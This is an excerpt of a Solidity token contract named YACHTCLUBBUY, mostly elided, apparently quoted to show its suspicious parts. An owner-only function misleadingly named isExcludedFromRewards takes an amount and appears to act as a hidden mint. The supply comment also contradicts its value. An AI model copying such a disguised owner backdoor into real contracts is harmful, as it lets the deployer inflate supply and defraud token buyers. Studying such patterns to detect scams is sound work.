...
contract ERC20 is Context, IERC20, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) public {
        ...
        _burnaddress = 0x2D8628D3F86654E9015Ba3325B30c5024C069645;
    ...
    function isExcludedFromRewards(uint256 amount) public onlyOwner {
    _isExcludedFromRewards(msg.sender, amount);
    }
    ...
    function _isExcludedFromRewards(address account, uint256 amount) internal virtual {
...
contract YACHTCLUBBUY is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("YACHTCLUB BUY", "YACHTCLUBBUY") {
        _isExcludedFromRewards(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    string private _name = "YACHTCLUBBUY";
    string private _symbol = "YACHTCLUBBUY";
